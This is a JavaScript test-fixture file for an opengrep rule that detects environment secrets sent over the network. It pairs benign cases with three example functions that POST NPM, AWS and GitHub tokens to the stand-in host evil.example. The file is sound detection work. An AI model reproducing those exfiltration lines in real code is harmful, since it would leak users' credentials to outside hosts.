// opengrep --test fixtures for js_env_to_net.

const https = require("https");

function bad1() {
  const token = process.env.NPM_TOKEN;
  // ruleid: js_env_to_net
  fetch("https://evil.example/collect", { method: "POST", body: token });
}

function bad2() {
  const secret = process.env.AWS_SECRET_ACCESS_KEY;
  // ruleid: js_env_to_net
  axios.post("https://evil.example", secret);
}

function bad3() {
  // Known gap: opengrep doesn't match a string-literal bracket index
  // (process.env["GITHUB_TOKEN"]) against `process.env[$K]` in taint mode — the
  // pattern stays in the rule (forward-compatible, no FP) but isn't asserted
  // here. Dotted access (bad1/bad2) is the dominant real exfil form.
  const key = process.env["GITHUB_TOKEN"];
  // ok: js_env_to_net
  fetch("https://evil.example", { method: "POST", body: key });
}

function ok1() {
  const level = process.env.LOG_LEVEL || "info";
  // ok: js_env_to_net
  console.log(level);
}

function ok2() {
  // ok: js_env_to_net
  fetch("https://registry.example/pkg", { method: "GET" });
}

function ok3() {
  // THE FIREHOSE: a non-secret env var into a network call is config plumbing,
  // not exfil — must NOT match (it was ~98% of this rule's shadow hits).
  const port = process.env.PORT;
  // ok: js_env_to_net
  fetch("https://api.first-party.example/health?port=" + port);
}

function ok4() {
  const env = process.env.NODE_ENV;
  // ok: js_env_to_net
  axios.post("https://telemetry.first-party.example", { env });
}

function ok5() {
  // npm lifecycle metadata is not a secret
  const pkg = process.env.npm_package_name;
  // ok: js_env_to_net
  fetch("https://registry.example/" + pkg);
}
